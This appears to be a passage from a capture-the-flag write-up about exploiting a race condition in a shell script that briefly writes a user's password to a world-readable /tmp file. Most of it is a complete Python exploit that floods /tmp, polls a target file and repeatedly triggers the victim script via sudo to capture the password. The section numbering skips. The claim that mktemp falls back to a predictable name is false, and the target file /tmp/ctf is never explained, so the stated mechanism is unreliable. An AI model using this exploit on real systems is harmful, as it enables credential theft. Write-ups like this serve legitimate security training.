### 2. Analyzing the Old Script

The file `old.sh` provides a clue about how the password is temporarily exposed:

```bash
daphne@hades:~$ cat old.sh 

#!/bin/bash
#OUTPUT="PASSWORD_DELIA" <-- UPDATE IT!
secretfile=$(mktemp /tmp/XXX)
chmod 664 "$secretfile"
exec 5>"$secretfile"
echo $OUTPUT >&5
sleep 0.01
rm "$secretfile"
```

#### Key Observations:
* The script uses `mktemp /tmp/XXX` to create a temporary file with a 3-character random suffix
* The password is written to this file for **0.01 seconds** before being deleted
* The file has permissions `664`, making it readable by others

### 4. Understanding the Race Condition

The script creates a temporary file in `/tmp` that exists for only 0.01 seconds. To exploit this:

1. **Fill `/tmp` directory**: By creating all possible 3-character combinations (XXX), we exhaust `mktemp`'s randomization
2. **Force predictable filename**: When all combinations are taken, `mktemp` will fail or use a predictable fallback
3. **Race to read**: Continuously attempt to read the target file before it's deleted

### 5. The Exploit Script

I created a Python script to automate the race condition attack:

```bash
daphne@hades:/tmp/solution$ nano race_condition.py
```

```python
#!/usr/bin/env python3
"""
Race Condition Exploit for Mission 0x25
Fill all possible /tmp/XXX to force mktemp to create the file we control
"""

import os
import string
import subprocess
import time
from threading import Thread

def fill_tmp_directory():
    """Fill /tmp with all combinations of XXX (letters + digits)"""
    print("[*] Filling /tmp directory with all XXX combinations...")

    charset = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
    count = 0

    for i in charset:
        for j in charset:
            for k in charset:
                filename = f'/tmp/{i}{j}{k}'
                try:
                    open(filename, 'w').close()
                    count += 1
                    if count % 10000 == 0:
                        print(f"[+] Created {count} files...")
                except Exception as e:
                    pass

    print(f"[+] Total files created: {count}")
    return count

def read_loop(target_file, output_file):
    """Loop to read target file and append to output"""
    while True:
        try:
            with open(target_file, 'r') as f:
                content = f.read().strip()
                if content:
                    with open(output_file, 'a') as out:
                        out.write(content + '\n')
                    print(f"[!] Captured: {content}")
        except FileNotFoundError:
            pass  # File not created yet
        except Exception as e:
            pass
        time.sleep(0.001)  # Minimal delay

def trigger_script(iterations=100):
    """Trigger target script multiple times"""
    print(f"[*] Triggering script {iterations} times...")
    for i in range(iterations):
        try:
            subprocess.run(
                ['sudo', '-u', 'delia', '/bin/bash', '-c', '/usr/local/src/new.sh'],
                stderr=subprocess.DEVNULL,
                timeout=1
            )
        except Exception:
            pass
        if i % 10 == 0:
            print(f"[+] Triggered {i}/{iterations}")
        time.sleep(0.1)

def main():
    target_file = '/tmp/ctf'
    output_file = '/tmp/pass'

    print("="*60)
    print("Race Condition Exploit - Mission 0x25")
    print("="*60)

    # Step 1: Fill /tmp directory
    choice = input("[?] Fill /tmp directory? (y/n): ")
    if choice.lower() == 'y':
        fill_tmp_directory()

    # Step 2: Setup target file
    print(f"\n[*] Setting up target file: {target_file}")
    if os.path.exists(target_file):
        os.remove(target_file)

    # Clear output file
    if os.path.exists(output_file):
        os.remove(output_file)

    # Step 3: Start reading thread
    print("[*] Starting read loop thread...")
    read_thread = Thread(target=read_loop, args=(target_file, output_file), daemon=True)
    read_thread.start()

    # Step 4: Trigger script
    time.sleep(1)
    trigger_script(100)

    # Step 5: Analyze results
    time.sleep(2)
    print("\n" + "="*60)
    print("[*] Analyzing results...")

    if os.path.exists(output_file):
        with open(output_file, 'r') as f:
            lines = f.readlines()

        # Find passwords that appear more than once
        from collections import Counter
        counter = Counter(lines)

        print(f"[+] Total captures: {len(lines)}")
        print("\n[!] Detected passwords:")
        for password, count in counter.most_common(5):
            if count > 1:
                print(f"    {password.strip()} (appeared {count}x)")
    else:
        print("[-] No data captured")

    print("="*60)

if __name__ == '__main__':
    main()
```

### 8. Explanation

* **Race Condition**: A vulnerability where the outcome depends on the timing of events. Here, the password file exists for only 0.01 seconds, creating a race between creation and deletion.
* **mktemp Exhaustion**: By creating all possible 3-character filenames, we force `mktemp` to fail or use a predictable pattern, making it easier to target.
* **Multi-threaded Attack**: One thread continuously reads the target file while another triggers the script repeatedly, increasing the chances of catching the password during its brief existence.
* **Temporary File Security**: This demonstrates why temporary files should have restrictive permissions (600) and be created in secure directories, and why sensitive data should never be written to predictable locations even temporarily.
